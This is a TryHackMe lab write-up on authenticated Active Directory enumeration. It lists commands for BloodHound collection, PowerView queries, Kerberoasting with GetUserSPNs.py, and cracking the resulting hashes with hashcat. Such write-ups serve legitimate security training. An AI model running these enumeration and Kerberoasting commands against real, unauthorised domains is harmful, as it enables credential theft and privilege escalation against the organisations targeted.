# 🏢 AD: Authenticated Enumeration

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [AD: Authenticated Enumeration](https://tryhackme.com/room/adauthenticatedenumeration) |
| **Difficulty** | 🟢 Easy |
| **Category** | Active Directory |
| **OS** | Windows |
| **Tools** | BloodHound, PowerView, SharpHound, ldapsearch |

---

## 🎯 Objective

Enumerate an Active Directory environment using valid domain credentials to map attack paths, identify misconfigurations, and find privilege escalation opportunities.

---

## 🔍 Reconnaissance with Credentials

```bash
# Verify credentials work
crackmapexec smb TARGET_IP -u 'user' -p 'password'

# Enumerate with valid creds
enum4linux -a -u 'user' -p 'password' TARGET_IP
```

---

## 🩸 BloodHound / SharpHound

```bash
# Run SharpHound collector (on Windows target)
.\SharpHound.exe -c All --zipfilename output.zip

# Or run remotely with Python
bloodhound-python -u user -p password -ns TARGET_IP -d domain.local -c all

# Import into BloodHound
# Start neo4j: sudo neo4j start
# Start bloodhound: bloodhound
# Upload the zip file
```

**BloodHound queries to run:**
- Find Shortest Path to Domain Admin
- Find all Kerberoastable Users
- Find all AS-REP Roastable Users
- Find Principals with DCSync Rights

---

## 🔑 PowerView (on Windows)

```powershell
# Import module
Import-Module PowerView.ps1

# Get domain info
Get-Domain
Get-DomainController

# Enumerate users
Get-DomainUser | select SamAccountName, Description

# Enumerate groups
Get-DomainGroup | select Name
Get-DomainGroupMember -Identity "Domain Admins"

# Find shares
Find-DomainShare -CheckShareAccess

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs
```

---

## 🎟️ Kerberoasting

```bash
# Get Kerberoastable accounts and hashes
GetUserSPNs.py domain.local/user:password -dc-ip TARGET_IP -request

# Crack with hashcat
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

---

## 📚 Lessons Learned

- BloodHound visualises attack paths that would be impossible to find manually
- Kerberoasting works against any account with a ServicePrincipalName (SPN) set
- PowerView is the Swiss army knife for authenticated AD enumeration
- Always check user Description fields — administrators sometimes leave passwords there

---
*by OwlRC 🦉 | github.com/OwlRC*
